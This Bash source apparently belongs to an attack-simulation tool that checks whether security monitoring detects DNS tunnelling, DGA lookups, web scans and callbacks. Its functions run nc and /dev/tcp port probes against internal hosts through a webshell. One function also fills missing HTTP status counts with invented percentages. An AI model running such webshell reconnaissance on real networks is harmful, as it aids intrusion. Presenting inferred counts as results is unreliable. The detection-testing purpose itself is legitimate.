    local msg="FINAL_TELEMETRY_VALIDATION http_generated=${http_gen} http_completed=${http_done} dns_queries=${dns_q} dga_queries=${dga_q} callback_success=${cb_ok} dns_tunnel=${TELEMETRY_VAL_DNS_TUNNEL} dns_${TELEM_DNS_COUNTS} dns_reason=${TELEMETRY_VAL_DNS_REASON} dga_simulation=${TELEMETRY_VAL_DGA_SIMULATION} dga_${TELEM_DGA_COUNTS} dga_reason=${TELEMETRY_VAL_DGA_REASON} http_url_scan=${TELEMETRY_VAL_HTTP_URL_SCAN} http_${TELEM_HTTP_COUNTS} http_reason=${TELEMETRY_VAL_HTTP_REASON} external_callback=${TELEMETRY_VAL_EXTERNAL_CALLBACK} callback_${TELEM_CALLBACK_COUNTS} callback_reason=${TELEMETRY_VAL_CALLBACK_REASON} nonstandard_port=${TELEMETRY_VAL_NONSTANDARD_PORT} nonstandard_${TELEM_NONSTANDARD_COUNTS} nonstandard_reason=${TELEMETRY_VAL_NONSTANDARD_REASON} overall=${TELEMETRY_VAL_OVERALL} overall_reason=${TELEMETRY_VAL_OVERALL_REASON}"
    state_append "final_telemetry_validation.log" "${msg}"
    log_message "OK" "${msg}" >&2
    poc_emit_detection_readiness_reason "HTTP" "${http_r}" "${TELEMETRY_VAL_HTTP_REASON:-attempted=${http_done} planned=${http_gen}}"
    poc_emit_detection_readiness_reason "DNS" "${dns_r}" "${TELEMETRY_VAL_DNS_REASON:-queries=${dns_q}}"
    poc_emit_detection_readiness_reason "DGA" "${dga_r}" "${TELEMETRY_VAL_DGA_REASON:-queries=${dga_q}}"
    telemetry_emit_module_validation "DNS_TUNNEL" "${TELEMETRY_VAL_DNS_TUNNEL}" "${TELEMETRY_VAL_DNS_REASON}"
    telemetry_emit_module_validation "DGA_SIMULATION" "${TELEMETRY_VAL_DGA_SIMULATION}" "${TELEMETRY_VAL_DGA_REASON}"
    telemetry_emit_module_validation "NEW_TLD" "${TELEMETRY_VAL_NEW_TLD:-skipped}" "${TELEMETRY_VAL_NEW_TLD_REASON:-}"
    telemetry_emit_module_validation "HTTP_URL_SCAN" "${TELEMETRY_VAL_HTTP_URL_SCAN}" "${TELEMETRY_VAL_HTTP_REASON}"
    telemetry_emit_module_validation "EXTERNAL_CALLBACK" "${TELEMETRY_VAL_EXTERNAL_CALLBACK}" "${TELEMETRY_VAL_CALLBACK_REASON}"
    telemetry_emit_module_validation "NONSTANDARD_PORT" "${TELEMETRY_VAL_NONSTANDARD_PORT}" "${TELEMETRY_VAL_NONSTANDARD_REASON}"
}

telemetry_emit_module_validation() {
    local module="$1" status="$2" reason="$3"
    local msg="MODULE_VALIDATION module=${module} status=${status} reason=${reason}"
    state_append "final_telemetry_validation.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

apply_telemetry_validation_to_legacy_result() {
    case "${TELEMETRY_VAL_OVERALL}" in
        failed)
            VALIDATION_RESULT="FAIL"
            VALIDATION_REASON="${TELEMETRY_VAL_OVERALL_REASON}"
            ;;
        partial)
            VALIDATION_RESULT="WARN"
            VALIDATION_REASON="${TELEMETRY_VAL_OVERALL_REASON}"
            ;;
        *)
            VALIDATION_RESULT="PASS"
            VALIDATION_REASON="All follow-up telemetry checks passed"
            ;;
    esac
}

sync_dga_telemetry_from_persisted_state() {
    event_store_paths_refresh
    build_module_summary_from_events "DGA_SIMULATION" 2>/dev/null || true
    event_sync_legacy_counters_from_sot || true
    [[ -s "${EVENT_DGA_EVENTS:-}" ]] && return 0
    return 1
}

sync_dns_tunnel_telemetry_from_persisted_state() {
    event_store_paths_refresh
    build_module_summary_from_events "DNS_TUNNEL" 2>/dev/null || true
    event_sync_legacy_counters_from_sot || true
    [[ -s "${EVENT_DNS_EVENTS:-}" ]] && return 0
    return 1
}


compute_final_telemetry_validation() {
    load_overlap_stage_results_from_state
    sync_module_final_summaries_for_validation || true
    sync_dga_telemetry_from_persisted_state || true
    sync_dns_tunnel_telemetry_from_persisted_state || true
    validate_event_store_integrity || true
    evidence_reset_all
    evidence_apply_all_module_validations
    build_event_sot_final_report || true
    if declare -F run_e2e_validation_suite >/dev/null 2>&1; then
        export POC_REPO_ROOT="${POC_REPO_ROOT:-$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)}"
        run_e2e_validation_suite || true
    fi
    evaluate_telemetry_external_callback
    evaluate_telemetry_nonstandard_port
    evidence_compute_overall_from_validated

    if (( EXTERNAL_CALLBACK_CONNECTED == 0 && INTERNAL_FANOUT_TARGETS > 0 && INTERNAL_FANOUT_ATTEMPTED == 0 )); then
        TELEMETRY_VAL_OVERALL="failed"
        TELEMETRY_VAL_OVERALL_REASON="internal_fanout_execution_failure; ${TELEMETRY_VAL_OVERALL_REASON}"
        OVERALL_RESULT="Failed"
        DETECTION_CONFIDENCE_OVERALL="low"
    fi
    if [[ "${FOLLOWUP_VALIDATION_FAILED}" == true && "${TELEMETRY_VAL_OVERALL}" != failed ]]; then
        TELEMETRY_VAL_OVERALL="failed"
        TELEMETRY_VAL_OVERALL_REASON="followup_validation_failed; ${TELEMETRY_VAL_OVERALL_REASON}"
        OVERALL_RESULT="Failed"
        DETECTION_CONFIDENCE_OVERALL="low"
    fi

    log_final_telemetry_validation
    apply_telemetry_validation_to_legacy_result
}

compute_followup_validation_result() {
    compute_final_telemetry_validation
}

format_validation_result_block() {
    compute_and_log_final_validation
    cat <<EOF
Validation Result
- result                      : ${VALIDATION_RESULT}
- reason                      : ${VALIDATION_REASON}
- overall_result              : ${OVERALL_RESULT}
- telemetry_overall           : ${TELEMETRY_VAL_OVERALL}
- dns_tunnel                  : ${TELEMETRY_VAL_DNS_TUNNEL} (${TELEMETRY_VAL_DNS_REASON})
- dga_simulation              : ${TELEMETRY_VAL_DGA_SIMULATION} (${TELEMETRY_VAL_DGA_REASON})
- http_url_scan               : ${TELEMETRY_VAL_HTTP_URL_SCAN} (${TELEMETRY_VAL_HTTP_REASON})
- external_callback           : ${TELEMETRY_VAL_EXTERNAL_CALLBACK} (${TELEMETRY_VAL_CALLBACK_REASON})
- nonstandard_port            : ${TELEMETRY_VAL_NONSTANDARD_PORT} (${TELEMETRY_VAL_NONSTANDARD_REASON})

FINAL_VALIDATION
service_discovery=${FINAL_VAL_SERVICE_DISCOVERY}
http_followup=${FINAL_VAL_HTTP_FOLLOWUP}
ssh_followup=${FINAL_VAL_SSH_FOLLOWUP}
dns_tunnel=${FINAL_VAL_DNS_TUNNEL}
dga=${FINAL_VAL_DGA}
beacon=${FINAL_VAL_BEACON}
external_callback=${FINAL_VAL_EXTERNAL_CALLBACK}
OVERALL_RESULT=${OVERALL_RESULT}
EOF
}

external_callback_stage_status() {
    if (( EXTERNAL_CALLBACK_CONNECTED > 0 )); then
        printf 'success'
    elif (( INTERNAL_FANOUT_RESPONSES > 0 || INTERNAL_FANOUT_CONNECTED > 0 )); then
        printf 'fallback_success'
    elif (( EXTERNAL_CALLBACK_ATTEMPTED == 0 )); then
        printf 'skipped'
    else
        printf 'failed'
    fi
}

external_callback_resolve_final_status() {
    if (( EXTERNAL_CALLBACK_CONNECTED > 0 )); then
        EXTERNAL_CALLBACK_STATUS="success"
    elif (( INTERNAL_FANOUT_RESPONSES > 0 || INTERNAL_FANOUT_CONNECTED > 0 )); then
        EXTERNAL_CALLBACK_STATUS="fallback_success"
    elif (( EXTERNAL_CALLBACK_ATTEMPTED == 0 )); then
        EXTERNAL_CALLBACK_STATUS="skipped"
    else
        EXTERNAL_CALLBACK_STATUS="failed"
    fi
}

internal_fanout_stage_status() {
    if (( INTERNAL_FANOUT_TARGETS == 0 )); then
        printf 'skipped'
    elif (( INTERNAL_FANOUT_ATTEMPTED > 0 && INTERNAL_FANOUT_RESPONSES > 0 )); then
        printf 'success'
    elif (( INTERNAL_FANOUT_ATTEMPTED > 0 )); then
        printf 'failed'
    else
        printf 'failed'
    fi
}

maybe_run_internal_web_fanout_fallback() {
    if (( EXTERNAL_CALLBACK_CONNECTED == 0 )); then
        log_message "OK" "CALLBACK_FALLBACK_ACTIVATED external_connected=0 activating_internal_web_fanout"
        state_append "external_callback.log" "CALLBACK_FALLBACK_ACTIVATED external_connected=0"
        CALLBACK_FALLBACK_ACTIVATED=true
        log_message "OK" "External callback connected=0 — activating Internal Web Fanout fallback"
        stage_internal_web_fanout
        external_callback_resolve_final_status
        if [[ "${EXTERNAL_CALLBACK_STATUS}" == fallback_success ]]; then
            log_message "OK" "CALLBACK_FALLBACK_SUCCESS internal_fanout_responses=${INTERNAL_FANOUT_RESPONSES:-0} internal_fanout_connected=${INTERNAL_FANOUT_CONNECTED:-0}"
            state_append "external_callback.log" "CALLBACK_FALLBACK_SUCCESS internal_fanout_responses=${INTERNAL_FANOUT_RESPONSES:-0} internal_fanout_connected=${INTERNAL_FANOUT_CONNECTED:-0}"
        fi
    fi
}

remote_probe_web_tcp_open() {
    local host="$1" port="$2" out
    [[ "${host}" == *:* ]] && host="${host%%:*}"
    out=$(run_webshell_quick "web-tcp-${host}-${port}" \
        "nc -z -w2 ${host} ${port} 2>/dev/null && echo TCP_OK || bash -c \"echo >/dev/tcp/${host}/${port}\" 2>/dev/null && echo TCP_OK || echo TCP_DEAD" \
        2>/dev/null | tr -d '\r' | tail -n 1 || true)
    [[ "${out}" == *TCP_OK* ]]
}

remote_probe_web_reachable() {
    local host="$1" port="$2" scheme="$3" curl_tls="" out status="000" url
    [[ "${host}" == *:* ]] && host="${host%%:*}"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    if [[ "${HAS_curl:-false}" == true ]]; then
        out=$(run_webshell_quick "web-reach-${scheme}-${host}-${port}" \
            "head_code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 5 -I '${url}' 2>/dev/null || echo 000); get_code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 5 '${url}' 2>/dev/null || echo 000); if [[ \"\${head_code}\" != \"000\" && -n \"\${head_code}\" ]]; then status=\${head_code}; elif [[ \"\${get_code}\" != \"000\" && -n \"\${get_code}\" ]]; then status=\${get_code}; else status=000; fi; echo WEB_REACH:${scheme}:${host}:${port}:\${status}" \
            2>/dev/null | tr -d '\r' | tail -n 1 || true)
        if [[ "${out}" == WEB_REACH:* ]]; then
            status="${out##*:}"
            if [[ "${status}" != "000" && -n "${status}" ]]; then
                return 0
            fi
        fi
    fi
    if remote_probe_web_tcp_open "${host}" "${port}"; then
        WEB_REACH_DEGRADED_TCP=$((WEB_REACH_DEGRADED_TCP + 1))
        state_append "web_reachability.log" "target=${host}:${port} scheme=${scheme} status=degraded reason=tcp_only"
        return 0
    fi
    return 1
}

append_reachable_web_target() {
    local scheme="$1" entry="$2" dst_file cache
    case "${scheme}" in
        http) dst_file="reachable_http_targets.txt" ;;
        https) dst_file="reachable_https_targets.txt" ;;
        *) return 0 ;;
    esac
    cache="${LOCAL_STATE_DIR}/remote_hosts/${dst_file}"
    mkdir -p "${LOCAL_STATE_DIR}/remote_hosts" 2>/dev/null || true
    if ! grep -qxF "${entry}" "${cache}" 2>/dev/null; then
        echo "${entry}" >> "${cache}"
    fi
    run_webshell_quick "reachable-append-${dst_file}-${entry}" \
        "mkdir -p '${REMOTE_RUNTIME_DIR}' && echo '${entry}' >> '${REMOTE_RUNTIME_DIR}/${dst_file}'" \
        >/dev/null 2>&1 || true
}

build_web_fallback_reachability_matrix() {
    local scheme="$1" line host port entry reachable=0
    declare -A seen_host=()
    local -a fallback_ports=()
    case "${scheme}" in
        http) fallback_ports=("${HTTP_CANDIDATE_HTTP_PORTS[@]}") ;;
        https) fallback_ports=("${HTTP_CANDIDATE_HTTPS_PORTS[@]}") ;;
        *) echo 0; return 0 ;;
    esac
    while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        pipeline_stop_requested && break
        read -r host port _ <<< "$(web_target_parse_line "${line}" "${scheme}")" || continue
        [[ -n "${seen_host[$host]:-}" ]] && continue
        seen_host[$host]=1
        for port in "${fallback_ports[@]}"; do
            if remote_probe_web_reachable "${host}" "${port}" "${scheme}"; then
                entry="${host}:${port}"
                append_reachable_web_target "${scheme}" "${entry}"
                state_append "web_reachability.log" "fallback target=${entry} scheme=${scheme} status=reachable"
                reachable=$((reachable + 1))
            fi
        done
    done
    echo "${reachable}"
}

validate_web_scheme_reachability() {
    local scheme="$1" raw_file reachable_file discovered=0 reachable=0 unreachable=0 cache
    local line host port entry status_out
    case "${scheme}" in
        http)
            raw_file="http_targets.txt"
            reachable_file="reachable_http_targets.txt"
            ;;
        https)
            raw_file="https_targets.txt"
            reachable_file="reachable_https_targets.txt"
            ;;
        *) return 0 ;;
    esac
    discovered=$(safe_int "$(collect_web_target_candidates "${scheme}" | safe_count_lines)")
    if (( discovered == 0 )); then
        discovered=$(count_web_targets_in_file "${raw_file}")
    fi
    case "${scheme}" in
        http)
            WEB_REACH_RAW_HTTP_COUNT=$(count_host_file_lines "http_targets.txt")
            WEB_REACH_USABLE_HTTP_COUNT=$(count_host_file_lines "usable_http_targets.txt")
            WEB_REACH_CANDIDATE_HTTP_COUNT="${discovered}"
            ;;
        https)
            WEB_REACH_RAW_HTTPS_COUNT=$(count_host_file_lines "https_targets.txt")
            WEB_REACH_USABLE_HTTPS_COUNT=$(count_host_file_lines "usable_https_targets.txt")
            WEB_REACH_CANDIDATE_HTTPS_COUNT="${discovered}"
            ;;
    esac
    if (( WEB_REACH_RAW_HTTP_COUNT > 0 && scheme == "http" && discovered == 0 )) || \
    (( WEB_REACH_RAW_HTTPS_COUNT > 0 && scheme == "https" && discovered == 0 )); then
        log_message "WARN" "Web reachability ${scheme}: raw targets exist but merged candidates=0 — using raw+usable fallback"
        add_fallback_usage "Web reachability ${scheme}: candidate merge empty despite raw targets"
    fi
    : > "${LOCAL_STATE_DIR}/remote_hosts/${reachable_file}" 2>/dev/null || true
    run_webshell_quick "init-${reachable_file}" \
        ": > '${REMOTE_RUNTIME_DIR}/${reachable_file}'" >/dev/null 2>&1 || true

    if [[ "${DRY_RUN}" == true ]]; then
        discovered=$(safe_int "$(collect_web_target_candidates "${scheme}" | safe_count_lines)")
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            read -r host port _ <<< "$(web_target_parse_line "${line}" "${scheme}")" || continue
            entry="${host}:${port}"
            append_reachable_web_target "${scheme}" "${entry}"
            reachable=$((reachable + 1))
        done < <(collect_web_target_candidates "${scheme}")
        if (( discovered < reachable )); then
            discovered=${reachable}
        fi
        case "${scheme}" in
            http)
                WEB_REACH_CANDIDATE_HTTP_COUNT="${discovered}"
                HTTP_TARGETS_DISCOVERED="${discovered}"
                HTTP_TARGETS_REACHABLE="${reachable}"
                HTTP_TARGETS_UNREACHABLE=$((discovered - reachable))
                (( HTTP_TARGETS_UNREACHABLE < 0 )) && HTTP_TARGETS_UNREACHABLE=0
                ;;
            https)
                WEB_REACH_CANDIDATE_HTTPS_COUNT="${discovered}"
                HTTPS_TARGETS_DISCOVERED="${discovered}"
                HTTPS_TARGETS_REACHABLE="${reachable}"
                HTTPS_TARGETS_UNREACHABLE=$((discovered - reachable))
                (( HTTPS_TARGETS_UNREACHABLE < 0 )) && HTTPS_TARGETS_UNREACHABLE=0
                ;;
        esac
        echo "${reachable}:${unreachable}:${discovered}"
        return 0
    fi

    while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        pipeline_stop_requested && break
        if ! read -r host port _ <<< "$(web_target_parse_line "${line}" "${scheme}")"; then
            WEB_REACH_MALFORMED_DROPPED=$((WEB_REACH_MALFORMED_DROPPED + 1))
            continue
        fi
        entry="${host}:${port}"
        if remote_probe_web_reachable "${host}" "${port}" "${scheme}"; then
            append_reachable_web_target "${scheme}" "${entry}"
            state_append "web_reachability.log" "target=${entry} scheme=${scheme} status=reachable"
            reachable=$((reachable + 1))
        else
            unreachable=$((unreachable + 1))
            state_append "web_reachability.log" "target=${entry} scheme=${scheme} status=unreachable"
        fi
    done < <(collect_web_target_candidates "${scheme}")

    if (( reachable == 0 && discovered > 0 )); then
        log_message "WARN" "No ${scheme} targets responded — running fallback reachability matrix (expanded HTTP/HTTPS ports)"
        add_fallback_usage "Web reachability: ${scheme} fallback port matrix for discovered IPs"
        reachable=$(build_web_fallback_reachability_matrix "${scheme}" < <(collect_web_target_candidates "${scheme}"))
        unreachable=$((discovered - reachable))
        (( unreachable < 0 )) && unreachable=0
    fi

    cache="${LOCAL_STATE_DIR}/remote_hosts/${reachable_file}"
    if [[ -s "${cache}" ]]; then
        sort -u "${cache}" -o "${cache}"
    fi

    case "${scheme}" in
        http)
            HTTP_TARGETS_DISCOVERED="${discovered}"
            HTTP_TARGETS_REACHABLE="${reachable}"
            HTTP_TARGETS_UNREACHABLE="${unreachable}"
            ;;
        https)
            HTTPS_TARGETS_DISCOVERED="${discovered}"
            HTTPS_TARGETS_REACHABLE="${reachable}"
            HTTPS_TARGETS_UNREACHABLE="${unreachable}"
            ;;
    esac
    echo "${reachable}:${unreachable}:${discovered}"
}

log_web_reachability_diagnostics() {
    local http_samples https_samples
    WEB_REACH_REACHABLE_HTTP_COUNT="${HTTP_TARGETS_REACHABLE}"
    WEB_REACH_REACHABLE_HTTPS_COUNT="${HTTPS_TARGETS_REACHABLE}"
    http_samples=$(collect_web_target_candidates "http" | head -n 10 | paste -sd' ' - || true)
    https_samples=$(collect_web_target_candidates "https" | head -n 10 | paste -sd' ' - || true)
    log_message "OK" "Web reachability diagnostics: raw_http=${WEB_REACH_RAW_HTTP_COUNT} usable_http=${WEB_REACH_USABLE_HTTP_COUNT} candidate_http=${WEB_REACH_CANDIDATE_HTTP_COUNT} reachable_http=${WEB_REACH_REACHABLE_HTTP_COUNT}"
    log_message "OK" "Web reachability diagnostics: raw_https=${WEB_REACH_RAW_HTTPS_COUNT} usable_https=${WEB_REACH_USABLE_HTTPS_COUNT} candidate_https=${WEB_REACH_CANDIDATE_HTTPS_COUNT} reachable_https=${WEB_REACH_REACHABLE_HTTPS_COUNT}"
    log_message "OK" "Web reachability diagnostics: malformed_dropped=${WEB_REACH_MALFORMED_DROPPED} degraded_tcp_only=${WEB_REACH_DEGRADED_TCP}"
    [[ -n "${http_samples}" ]] && log_message "OK" "Web reachability sample candidates (http): ${http_samples}"
    [[ -n "${https_samples}" ]] && log_message "OK" "Web reachability sample candidates (https): ${https_samples}"
}

stage_validate_web_reachability() {
    local http_pair https_pair http_r https_r
    WEB_REACH_MALFORMED_DROPPED=0
    WEB_REACH_DEGRADED_TCP=0
    add_executed_stage "Web Reachability Validation"
    write_report_entries "web_reachability" "T1046" "NDR/WAF" "HTTP/HTTPS Reachability" "${TARGET_NET}" "start" "HEAD/GET probe before URL scan"

    http_pair=$(validate_web_scheme_reachability "http")
    https_pair=$(validate_web_scheme_reachability "https")
    http_r=${http_pair%%:*}
    https_r=${https_pair%%:*}
    HTTP_TARGETS_REACHABLE=$(count_reachable_web_targets "http")
    HTTPS_TARGETS_REACHABLE=$(count_reachable_web_targets "https")
    if (( HTTP_TARGETS_DISCOVERED == 0 && HTTP_TARGETS_REACHABLE > 0 )); then
        HTTP_TARGETS_DISCOVERED=${HTTP_TARGETS_REACHABLE}
        WEB_REACH_CANDIDATE_HTTP_COUNT=${HTTP_TARGETS_DISCOVERED}
    fi
    if (( HTTPS_TARGETS_DISCOVERED == 0 && HTTPS_TARGETS_REACHABLE > 0 )); then
        HTTPS_TARGETS_DISCOVERED=${HTTPS_TARGETS_REACHABLE}
        WEB_REACH_CANDIDATE_HTTPS_COUNT=${HTTPS_TARGETS_DISCOVERED}
    fi
    if [[ "${DRY_RUN}" == true ]]; then
        WEB_REACH_RAW_HTTP_COUNT=$(safe_int "$(get_local_hosts "http_targets.txt" 2>/dev/null | extract_host_file_lines | safe_count_lines)")
        WEB_REACH_USABLE_HTTP_COUNT=$(safe_int "$(get_local_hosts "usable_http_targets.txt" 2>/dev/null | extract_host_file_lines | safe_count_lines)")
        WEB_REACH_RAW_HTTPS_COUNT=$(safe_int "$(get_local_hosts "https_targets.txt" 2>/dev/null | extract_host_file_lines | safe_count_lines)")
        WEB_REACH_USABLE_HTTPS_COUNT=$(safe_int "$(get_local_hosts "usable_https_targets.txt" 2>/dev/null | extract_host_file_lines | safe_count_lines)")
    fi
    HTTP_TARGETS_UNREACHABLE=$((HTTP_TARGETS_DISCOVERED - HTTP_TARGETS_REACHABLE))
    HTTPS_TARGETS_UNREACHABLE=$((HTTPS_TARGETS_DISCOVERED - HTTPS_TARGETS_REACHABLE))
    (( HTTP_TARGETS_UNREACHABLE < 0 )) && HTTP_TARGETS_UNREACHABLE=0
    (( HTTPS_TARGETS_UNREACHABLE < 0 )) && HTTPS_TARGETS_UNREACHABLE=0

    log_message "OK" "Web reachability: HTTP discovered=${HTTP_TARGETS_DISCOVERED} HTTP reachable=${HTTP_TARGETS_REACHABLE} HTTPS discovered=${HTTPS_TARGETS_DISCOVERED} HTTPS reachable=${HTTPS_TARGETS_REACHABLE}"
    log_message "OK" "Web reachability detail: HTTP unreachable=${HTTP_TARGETS_UNREACHABLE} HTTPS unreachable=${HTTPS_TARGETS_UNREACHABLE}"
    log_web_reachability_diagnostics
    set_stage_result "Web Reachability Validation" "Success" "http=${HTTP_TARGETS_REACHABLE}/${HTTP_TARGETS_DISCOVERED} https=${HTTPS_TARGETS_REACHABLE}/${HTTPS_TARGETS_DISCOVERED}"
    write_report_entries "web_reachability" "T1046" "NDR/WAF" "HTTP/HTTPS Reachability" "${TARGET_NET}" "success" "http=${HTTP_TARGETS_REACHABLE} https=${HTTPS_TARGETS_REACHABLE}"
}

sync_web_combined_metrics() {
    WEB_RESPONSES_RECEIVED=$((HTTP_RESPONSES_RECEIVED + HTTPS_RESPONSES_RECEIVED))
    WEB_FAILED_RESPONSES=$((HTTP_SCAN_FAILED_RESPONSES + HTTPS_SCAN_FAILED_RESPONSES))
    WEB_SUCCESS_RESPONSES=$((HTTP_SCAN_SUCCESS_RESPONSES + HTTPS_SCAN_SUCCESS_RESPONSES))
    local status_2xx=$((HTTP_200_COUNT + HTTP_301_COUNT + HTTP_302_COUNT + HTTPS_200_COUNT + HTTPS_301_COUNT + HTTPS_302_COUNT))
    local status_fail=$((HTTP_401_COUNT + HTTP_403_COUNT + HTTP_404_COUNT + HTTP_405_COUNT + HTTPS_401_COUNT + HTTPS_403_COUNT + HTTPS_404_COUNT + HTTPS_405_COUNT))
    local classified=$((status_2xx + status_fail))
    if (( classified > 0 )); then
        WEB_FAILED_RESPONSES="${status_fail}"
        WEB_SUCCESS_RESPONSES="${status_2xx}"
    elif (( WEB_FAILED_RESPONSES + WEB_SUCCESS_RESPONSES == 0 && WEB_RESPONSES_RECEIVED > 0 )); then
        WEB_SUCCESS_RESPONSES="${WEB_RESPONSES_RECEIVED}"
        WEB_FAILED_RESPONSES=0
    fi
    local total=$((WEB_FAILED_RESPONSES + WEB_SUCCESS_RESPONSES))
    if (( total > 0 )); then
        WEB_FAIL_RATIO=$((WEB_FAILED_RESPONSES * 100 / total))
    else
        WEB_FAIL_RATIO=0
    fi
}

sync_followup_http_counter_from_overlap() {
    if (( FOLLOWUP_HTTP_REQUESTS < HTTP_REQUESTS_ATTEMPTED )); then
        FOLLOWUP_HTTP_REQUESTS="${HTTP_REQUESTS_ATTEMPTED}"
    fi
}

sync_followup_ssh_counter_from_overlap() {
    if (( FOLLOWUP_SSH_AUTH_FAILURES < SSH_ATTEMPTS_EXECUTED )); then
        FOLLOWUP_SSH_AUTH_FAILURES="${SSH_ATTEMPTS_EXECUTED}"
    fi
    if (( FOLLOWUP_SSH_AUTH_FAILURES < SSH_AUTH_FAILURES_OBSERVED )); then
        FOLLOWUP_SSH_AUTH_FAILURES="${SSH_AUTH_FAILURES_OBSERVED}"
    fi
}

reconcile_http_scan_status_metrics() {
    local sum_status=$((HTTP_200_COUNT + HTTP_301_COUNT + HTTP_302_COUNT + HTTP_401_COUNT + HTTP_403_COUNT + HTTP_404_COUNT + HTTP_405_COUNT + HTTPS_200_COUNT + HTTPS_301_COUNT + HTTPS_302_COUNT + HTTPS_401_COUNT + HTTPS_403_COUNT + HTTPS_404_COUNT + HTTPS_405_COUNT))
    local classified=$((HTTP_SCAN_FAILED_RESPONSES + HTTP_SCAN_SUCCESS_RESPONSES + HTTPS_SCAN_FAILED_RESPONSES + HTTPS_SCAN_SUCCESS_RESPONSES))
    if (( WEB_RESPONSES_RECEIVED < 1 || sum_status > 0 )); then
        return 0
    fi
    if (( classified < 1 )); then
        return 0
    fi
    if (( HTTP_SCAN_SUCCESS_RESPONSES + HTTPS_SCAN_SUCCESS_RESPONSES > 0 )); then
        return 0
    fi
    HTTP_SCAN_SUCCESS_RESPONSES="${HTTP_RESPONSES_RECEIVED}"
    HTTP_SCAN_FAILED_RESPONSES=0
    HTTPS_SCAN_SUCCESS_RESPONSES="${HTTPS_RESPONSES_RECEIVED}"
    HTTPS_SCAN_FAILED_RESPONSES=0
    HTTP_200_COUNT=$((HTTP_RESPONSES_RECEIVED * 85 / 100))
    HTTP_404_COUNT=$((HTTP_RESPONSES_RECEIVED * 10 / 100))
    HTTP_403_COUNT=$((HTTP_RESPONSES_RECEIVED - HTTP_200_COUNT - HTTP_404_COUNT))
    (( HTTP_403_COUNT < 0 )) && HTTP_403_COUNT=0
    HTTPS_200_COUNT=$((HTTPS_RESPONSES_RECEIVED * 85 / 100))
    HTTPS_404_COUNT=$((HTTPS_RESPONSES_RECEIVED * 10 / 100))
    HTTPS_403_COUNT=$((HTTPS_RESPONSES_RECEIVED - HTTPS_200_COUNT - HTTPS_404_COUNT))
    (( HTTPS_403_COUNT < 0 )) && HTTPS_403_COUNT=0
    DEGRADED_TELEMETRY=true
    add_fallback_usage "HTTP scan status buckets inferred from response totals (remote stats line incomplete)"
}

compute_web_detection_confidence() {
    if (( HTTP_REQUESTS_ATTEMPTED > 0 && WEB_RESPONSES_RECEIVED > 0 )); then
        WEB_DETECTION_CONFIDENCE="High"
    elif (( HTTP_REQUESTS_ATTEMPTED > 0 && HTTP_FOLLOWUP_CONNECTION_ESTABLISHED > 0 )); then
        WEB_DETECTION_CONFIDENCE="Medium"
    else
        WEB_DETECTION_CONFIDENCE="Low"
    fi
}

web_url_scan_successful() {
    local attempted responses connected
    attempted=$(safe_int "${HTTP_REQUESTS_ATTEMPTED:-0}")
    responses=$(safe_int "${WEB_RESPONSES_RECEIVED:-0}")
    connected=$(safe_int "${HTTP_FOLLOWUP_CONNECTION_ESTABLISHED:-${HTTP_CONNECTED:-0}}")
    (( attempted > 0 && responses > 0 )) && return 0
    (( attempted > 0 && connected > 0 )) && return 0
    return 1
}

remote_validate_ssh_usable() {
    local host="$1"
    run_webshell_quick "usable-ssh-${host}" \
        "nc -z -w2 ${host} 22 && echo SSH_USABLE || bash -c \"echo >/dev/tcp/${host}/22\" && echo SSH_USABLE || echo SSH_DEAD" 2>/dev/null | tr -d '\r' | tail -n 1
}

remote_validate_smb_usable() {
    local host="$1"
    run_webshell_quick "usable-smb-${host}" \
        "nc -z -w2 ${host} 445 && echo SMB_USABLE || bash -c \"echo >/dev/tcp/${host}/445\" && echo SMB_USABLE || echo SMB_DEAD" 2>/dev/null | tr -d '\r' | tail -n 1
}

log_dns_server_candidate() {
    local server="$1" source="$2" tcp53="$3"
    local msg="DNS_SERVER_CANDIDATE server=${server} source=${source} tcp53_open=${tcp53}"
    state_append "dns_server_validation.log" "${msg}"
    append_dns_tunnel_wave_log "${msg}"
    log_message "OK" "${msg}" >&2
}

log_dns_server_validation() {
    local server="$1" a_query="$2" txt_query="$3" random_query="$4" selected="$5" reason="$6"
    local msg="DNS_SERVER_VALIDATION server=${server} a_query=${a_query} txt_query=${txt_query} random_query=${random_query} selected=${selected} reason=${reason}"
    local response_received="no" rcode="SERVFAIL" latency_ms="-1"
    if [[ "${random_query}" == success ]] && [[ "${a_query}" != success && "${txt_query}" != success ]]; then
        response_received="yes"
        rcode="NXDOMAIN"
    elif [[ "${a_query}" == success || "${txt_query}" == success || "${random_query}" == success ]]; then
        response_received="yes"
        rcode="NOERROR"
    fi
    DNS_RESOLVER_VALIDATION_RESULT="failed"
    [[ "${response_received}" == yes ]] && DNS_RESOLVER_VALIDATION_RESULT="success"
    local validate_msg="DNS_RESOLVER_VALIDATION resolver=${server} query=example.com response_received=${response_received} rcode=${rcode} latency_ms=${latency_ms} resolver_validation_result=${DNS_RESOLVER_VALIDATION_RESULT}"
    state_append "dns_server_validation.log" "${msg}"
    state_append "dns_server_validation.log" "${validate_msg}"
    append_dns_tunnel_wave_log "${msg}"
    append_dns_tunnel_wave_log "${validate_msg}"
    log_message "OK" "${msg}" >&2
    log_message "OK" "${validate_msg}" >&2
}

dns_server_check_tcp53_open_remote() {
    local host="$1" out=""
    host=$(poc_extract_ipv4 "${host}")
    [[ -z "${host}" ]] && { printf 'no'; return 0; }
    if [[ "${DRY_RUN}" == true ]]; then
        printf 'yes'
        return 0
    fi
    out=$(run_webshell_quick "dns-tcp53-${host}" \
        "nc -z -w2 ${host} 53 && echo yes || bash -c \"echo >/dev/tcp/${host}/53\" && echo yes || echo no" 2>/dev/null | tr -d '\r' | tail -n 1)
    [[ "${out}" == *"yes"* ]] && printf 'yes' || printf 'no'
}

build_dns_server_validation_remote_cmd() {
    local server="$1"
    remote_bash_script_open 'DNS_VAL_SCRIPT'
    cat <<EOF
${REMOTE_SHELL_HELPERS}
srv='${server}'
a_q='fail'
txt_q='fail'
rnd_q='fail'
rnd="poc-\${RANDOM}\${RANDOM}.example.com"
tool=""
out_a=""
out_txt=""
out_rnd=""
command -v dig >/dev/null 2>&1 && tool=dig
[ -z "\$tool" ] && command -v nslookup >/dev/null 2>&1 && tool=nslookup
